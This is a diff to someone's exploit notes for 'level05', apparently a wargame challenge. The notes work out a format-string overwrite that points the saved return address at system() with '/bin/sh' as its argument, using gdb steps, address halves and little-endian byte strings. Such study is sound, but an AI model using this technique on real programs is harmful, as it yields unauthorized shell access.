@@ -31,10 +31,17 @@ address of system(): 0xf7e6aed0
     f7e6 = 63462 = $10
     aed0 = 44752 = $11
 
+to find eip:    gdb ./level05
+                b printf
+                run <<< ""
+                x/xw $sp
+                0xffffd57c:	0x0804850c
+                eip       : addr in main
+
 EIP: 0xffffd66c <- &system
     \x6c\xd6\xff\xff
     \x6e\xd6\xff\xff
-system arg: 0xffffd674 <- &"/bin/sh"
+system arg EIP+8: 0xffffd674 <- &"/bin/sh"
     \x74\xd6\xff\xff
     \x76\xd6\xff\xff
 
